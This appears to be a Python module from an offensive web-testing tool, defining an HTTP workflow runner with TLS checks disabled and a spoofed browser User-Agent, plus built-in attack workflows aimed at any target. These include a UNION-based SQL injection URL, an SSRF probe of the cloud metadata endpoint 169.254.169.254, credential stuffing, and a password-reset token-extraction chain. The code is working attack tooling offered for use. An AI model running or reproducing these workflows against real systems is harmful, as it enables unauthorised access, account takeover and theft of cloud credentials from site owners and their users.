import json, re, time, os
from typing import Dict, List, Optional, Any, Callable

from tools.log_utils import get_logger

logger = get_logger("workflow")


class WorkflowStep:
    def __init__(self, name: str, action: str, params: Dict = None,
                 condition: Dict = None, retry: int = 0,
                 retry_delay: float = 0):
        self.name = name
        self.action = action
        self.params = params or {}
        self.condition = condition
        self.retry = retry
        self.retry_delay = retry_delay

    def _check_condition(self, context: Dict) -> bool:
        if not self.condition:
            return True
        operator = self.condition.get("operator", "eq")
        key = self.condition.get("key", "")
        value = self.condition.get("value", "")
        actual = context.get(key, "")
        if operator == "eq":
            return actual == value
        elif operator == "ne":
            return actual != value
        elif operator == "gt":
            return float(actual) > float(value)
        elif operator == "lt":
            return float(actual) < float(value)
        elif operator == "contains":
            return value in str(actual)
        elif operator == "regex":
            return bool(re.search(value, str(actual)))
        return True

    def _interpolate(self, text: str, context: Dict) -> str:
        def _replace(m):
            key = m.group(1)
            return str(context.get(key, m.group(0)))
        return re.sub(r'\{\{(\w+)\}\}', _replace, text)

    def execute(self, context: Dict, http) -> Dict:
        if not self._check_condition(context):
            return {"step": self.name, "skipped": True}
        for attempt in range(self.retry + 1):
            try:
                result = self._do_execute(context, http)
                if result.get("status", 500) < 500:
                    return result
            except Exception as e:
                logger.debug("step %s attempt %d: %s", self.name, attempt, e)
            if attempt < self.retry and self.retry_delay > 0:
                time.sleep(self.retry_delay)
        return {"step": self.name, "error": "max retries exceeded"}

    def _do_execute(self, context: Dict, http) -> Dict:
        url = self._interpolate(self.params.get("url", ""), context)
        method = self.params.get("method", "GET").upper()
        headers = {}
        for k, v in self.params.get("headers", {}).items():
            headers[k] = self._interpolate(v, context)
        body = None
        if "body" in self.params:
            body = self._interpolate(json.dumps(self.params["body"]), context)
        data = {}
        if "data" in self.params:
            for k, v in self.params["data"].items():
                data[k] = self._interpolate(v, context)
        if method == "GET":
            r = http.get(url, headers=headers, timeout=10, verify=False)
        elif method == "POST":
            if body:
                r = http.post(url, data=body, headers=headers, timeout=10, verify=False)
            else:
                r = http.post(url, data=data, headers=headers, timeout=10, verify=False)
        elif method == "PUT":
            r = http.put(url, data=data, headers=headers, timeout=10, verify=False)
        elif method == "DELETE":
            r = http.delete(url, headers=headers, timeout=10, verify=False)
        else:
            r = http.get(url, headers=headers, timeout=10, verify=False)
        return {
            "step": self.name,
            "status": r.status_code,
            "length": len(r.text),
            "url": r.url,
        }


class Workflow:
    def __init__(self, name: str, steps: List[WorkflowStep] = None):
        self.name = name
        self.steps = steps or []

    def add_step(self, step: WorkflowStep) -> None:
        self.steps.append(step)

    def run(self, context: Dict = None) -> Dict:
        import requests
        http = requests.Session()
        http.headers["User-Agent"] = "Mozilla/5.0"
        if context is None:
            context = {}
        results = []
        for step in self.steps:
            r = step.execute(context, http)
            results.append(r)
            context.update({step.name: r.get("status", 0)})
        return {"workflow": self.name, "results": results}

    @classmethod
    def from_json(cls, path: str) -> 'Workflow':
        with open(path, "r", encoding="utf-8") as f:
            data = json.load(f)
        steps = []
        for s in data.get("steps", []):
            steps.append(WorkflowStep(
                name=s.get("name", ""),
                action=s.get("action", ""),
                params=s.get("params", {}),
                condition=s.get("condition"),
                retry=s.get("retry", 0),
                retry_delay=s.get("retry_delay", 0),
            ))
        return cls(data.get("name", "workflow"), steps)


SAMPLE_WORKFLOWS = {
    "login_and_extract": {
        "name": "login_and_extract",
        "steps": [
            {"name": "get_login_page", "action": "http_get",
             "params": {"url": "{{target}}/login", "method": "GET"}},
            {"name": "submit_login", "action": "http_post",
             "params": {"url": "{{target}}/login", "method": "POST",
                        "data": {"username": "{{username}}", "password": "{{password}}"}}},
            {"name": "extract_session", "action": "extract_session",
             "params": {"url": "{{target}}/profile"}},
        ]
    },
    "sqli_extract_data": {
        "name": "sqli_extract_data",
        "steps": [
            {"name": "test_injection", "action": "http_get",
             "params": {"url": "{{target}}/page?id={{payload}}", "method": "GET"}},
            {"name": "extract_version", "action": "http_get",
             "params": {"url": "{{target}}/page?id=1'+UNION+SELECT+@@version--", "method": "GET"}},
        ]
    },
    "ssrf_to_internal": {
        "name": "ssrf_to_internal",
        "steps": [
            {"name": "ssrf_probe", "action": "http_get",
             "params": {"url": "{{target}}/fetch?url=http://169.254.169.254/latest/meta-data/",
                        "method": "GET"}},
        ]
    },
    "credential_stuffing": {
        "name": "credential_stuffing",
        "steps": [
            {"name": "attempt_login", "action": "http_post",
             "params": {"url": "{{target}}/login", "data": {"username": "{{username}}", "password": "{{password}}"}}},
            {"name": "check_success", "action": "http_get",
             "params": {"url": "{{target}}/dashboard"},
             "condition": {"operator": "ne", "key": "attempt_login", "value": "401"}},
        ]
    },
    "multi_factor_auth": {
        "name": "multi_factor_auth",
        "steps": [
            {"name": "submit_otp", "action": "http_post",
             "params": {"url": "{{target}}/2fa", "data": {"code": "{{code}}"}}},
        ]
    },
    "password_reset_chain": {
        "name": "password_reset_chain",
        "steps": [
            {"name": "request_reset", "action": "http_post",
             "params": {"url": "{{target}}/reset", "data": {"email": "{{email}}"}}},
            {"name": "extract_token", "action": "http_get",
             "params": {"url": "{{target}}/reset/token"}},
            {"name": "set_new_password", "action": "http_post",
             "params": {"url": "{{target}}/reset/confirm", "data": {"token": "{{token}}", "password": "{{password}}"}}},
        ]
    },
}


def run(workflow_name: str, context: Dict = None) -> Dict:
    import requests
    http = requests.Session()
    http.headers["User-Agent"] = "Mozilla/5.0"
    if workflow_name in SAMPLE_WORKFLOWS:
        data = SAMPLE_WORKFLOWS[workflow_name]
        steps = []
        for s in data.get("steps", []):
            steps.append(WorkflowStep(
                name=s.get("name", ""),
                action=s.get("action", ""),
                params=s.get("params", {}),
                condition=s.get("condition"),
                retry=s.get("retry", 0),
                retry_delay=s.get("retry_delay", 0),
            ))
        w = Workflow(data.get("name", workflow_name), steps)
        return w.run(context or {})

    try:
        if os.path.exists(workflow_name):
            w = Workflow.from_json(workflow_name)
            return w.run(context or {})
    except Exception as e:
        logger.debug("workflow file: %s", e)
    return {"error": "workflow '%s' not found" % workflow_name}
